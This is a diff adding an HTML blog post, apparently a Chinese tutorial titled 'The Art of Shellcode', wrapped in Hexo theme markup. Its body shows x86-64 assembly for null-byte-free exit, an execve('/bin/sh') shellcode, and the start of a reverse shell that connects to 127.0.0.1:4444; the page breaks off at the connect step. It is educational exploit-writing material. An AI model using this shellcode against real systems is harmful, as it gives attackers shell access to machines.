@@ -1,0 +1,1465 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="HackC0der">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://HackC0der.github.io/2025/12/01/the-art-of-shellcode/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Art of Shellcode">
+<meta property="og:url" content="https://hackc0der.github.io/2025/12/01/The-Art-of-Shellcode/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hackc0der.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-12-01T01:51:46.000Z">
+<meta property="article:modified_time" content="2025-12-01T02:19:12.575Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackc0der.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/%E6%A9%98%E7%8C%AB.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/%E6%A9%98%E7%8C%AB.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/%E6%A9%98%E7%8C%AB.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            The Art of Shellcode | HackC0der&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"hackc0der.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":true},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"What you have done does make who you are...","subtitle":{"text":["明月几时有，把酒问青天","不知天上宫阙，今夕是何年？","我欲乘风归去，又恐琼楼玉宇，高处不胜寒。","起舞弄清影，何似在人间！","转朱阁，低绮户，照无眠。","不应有恨，何事长向别时圆？","人有悲欢离合，月有阴晴圆缺，此事古难全。","但愿人长久，千里共婵娟。","我步入丛林，因为我希望活得有意义…","我希望活得深刻，汲取生命所有的精髓！","把非生命的一切全都击溃…","以免在我生命终结时，发现自己从来没有活过…"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/HackC0der","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CSDN":{"path":"https://blog.csdn.net/Mr_Fmnwon?type=blog","icon":"fa-sharp fa-solid fa-browser"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        HackC0der&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                HackC0der&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon?type=blog"
+                                        >
+                                    <i class="fa-sharp fa-solid fa-browser fa-fw"></i>
+                                    CSDN
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon?type=blog"
+                        >
+                            <span>
+                                CSDN
+                            </span>
+                            
+                                <i class="fa-sharp fa-solid fa-browser fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">The Art of Shellcode</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">HackC0der</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-01 09:51:46</span>
+        <span class="mobile">2025-12-01 09:51:46</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-01 10:19:12</span>
+            <span class="mobile">2025-12-01 10:19:12</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>32 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="一、使用汇编器生成-shellcode"><a href="#一、使用汇编器生成-shellcode" class="headerlink" title="一、使用汇编器生成 shellcode"></a>一、使用汇编器生成 shellcode</h2><blockquote>
+<p>特别参考佬的博客：</p>
+<p>1、<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/17822153.html">The art of shellcode - LynneHuan - 博客园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>2、<a class="link" target="_blank" rel="noopener" href="https://v3rdant.cn/">V3rdant’s Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<h3 id="（一）汇编"><a href="#（一）汇编" class="headerlink" title="（一）汇编"></a>（一）汇编</h3><h4 id="1、汇编格式"><a href="#1、汇编格式" class="headerlink" title="1、汇编格式"></a>1、汇编格式</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">section .text       ; 代码段开始</span><br><span class="line">global _start       ; 声明程序入口点</span><br><span class="line"></span><br><span class="line">_start:             ; 程序入口标签</span><br><span class="line">    ; 这里是你的代码</span><br><span class="line">    ; 每条指令占一行</span><br></pre></td></tr></table></figure></div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; 最简单的退出程序 - 就像C语言的 return 0;</span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 系统调用：exit(0)</span><br><span class="line">    mov rax, 60    ; 60是exit的系统调用号</span><br><span class="line">    mov rdi, 0     ; 退出状态码为0</span><br><span class="line">    syscall        ; 执行系统调用</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2、系统调用固定格式"><a href="#2、系统调用固定格式" class="headerlink" title="2、系统调用固定格式"></a>2、系统调用固定格式</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; 系统调用模板</span><br><span class="line">mov rax, 系统调用号    ; 告诉系统要做什么</span><br><span class="line">mov rdi, 参数1        ; 第一个参数</span><br><span class="line">mov rsi, 参数2        ; 第二个参数  </span><br><span class="line">mov rdx, 参数3        ; 第三个参数</span><br><span class="line">syscall              ; 执行调用</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（二）shellcode-构建"><a href="#（二）shellcode-构建" class="headerlink" title="（二）shellcode 构建"></a>（二）shellcode 构建</h3><h4 id="1、退出程序"><a href="#1、退出程序" class="headerlink" title="1、退出程序"></a>1、退出程序</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 方法1：直接赋值（可能产生空字节）</span><br><span class="line">    mov rax, 60</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; 方法2：优化版本（避免空字节）</span><br><span class="line">    xor rax, rax    ; rax = 0</span><br><span class="line">    mov al, 60      ; rax的低8位=60 (al是rax的低8位)</span><br><span class="line">    xor rdi, rdi    ; rdi = 0</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2、输出字符串"><a href="#2、输出字符串" class="headerlink" title="2、输出字符串"></a>2、输出字符串</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; write(1, &quot;Hello\n&quot;, 6)</span><br><span class="line">    mov rax, 1          ; write系统调用号=1</span><br><span class="line">    mov rdi, 1          ; 文件描述符1=标准输出</span><br><span class="line">    mov rsi, message    ; 字符串地址</span><br><span class="line">    mov rdx, 6          ; 字符串长度</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; exit(0)</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">message: db &#x27;Hello&#x27;, 0x0A  ; 0x0A是换行符</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3、经典-execve-“-bin-sh”"><a href="#3、经典-execve-“-bin-sh”" class="headerlink" title="3、经典 execve(“&#x2F;bin&#x2F;sh”)"></a>3、经典 execve(“&#x2F;bin&#x2F;sh”)</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br><span class="line">    </span><br><span class="line">    ; 清空寄存器</span><br><span class="line">    xor rsi, rsi    ; rsi = 0 (第二个参数)</span><br><span class="line">    push rsi        ; 字符串结尾的null字节</span><br><span class="line">    </span><br><span class="line">    ; 把&quot;/bin/sh&quot;推入栈中</span><br><span class="line">    mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;的十六进制</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp    ; rdi指向字符串地址 (第一个参数)</span><br><span class="line">    </span><br><span class="line">    ; 设置参数数组</span><br><span class="line">    push rsi        ; argv[1] = NULL</span><br><span class="line">    push rdi        ; argv[0] = &quot;/bin/sh&quot;</span><br><span class="line">    mov rsi, rsp    ; rsi指向argv数组</span><br><span class="line">    </span><br><span class="line">    ; 环境变量为NULL</span><br><span class="line">    xor rdx, rdx    ; rdx = 0 (第三个参数)</span><br><span class="line">    </span><br><span class="line">    ; 执行execve</span><br><span class="line">    mov al, 59      ; execve系统调用号=59</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="4、反弹-shell"><a href="#4、反弹-shell" class="headerlink" title="4、反弹 shell"></a>4、反弹 shell</h4><h5 id="（1）创建-socket"><a href="#（1）创建-socket" class="headerlink" title="（1）创建 socket"></a>（1）创建 socket</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 41    ; socket()</span><br><span class="line">mov rdi, 2     ; AF_INET (IPv4)</span><br><span class="line">mov rsi, 1     ; SOCK_STREAM (TCP)</span><br><span class="line">xor rdx, rdx   ; protocol=0</span><br><span class="line">syscall</span><br><span class="line">mov rdi, rax   ; 保存socket描述符</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="（2）构建连接地址"><a href="#（2）构建连接地址" class="headerlink" title="（2）构建连接地址"></a>（2）构建连接地址</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 内存布局: [AF_INET][PORT][IP][0]</span><br><span class="line">push 0x0100007f    ; IP: 127.0.0.1</span><br><span class="line">push word 0x5c11   ; 端口: 4444 (0x115c)</span><br><span class="line">push word 0x2      ; AF_INET: 2</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="（3）连接"><a href="#（3）连接" class="headerlink" title="（3）连接"></a>（3）连接</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsi, rsp    ; 指向地址结构</span><br><span class="line">mov rdx, 16     ; 地址长度</span><br><span class="line">mov rax, 42     ; connect()</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div>
+
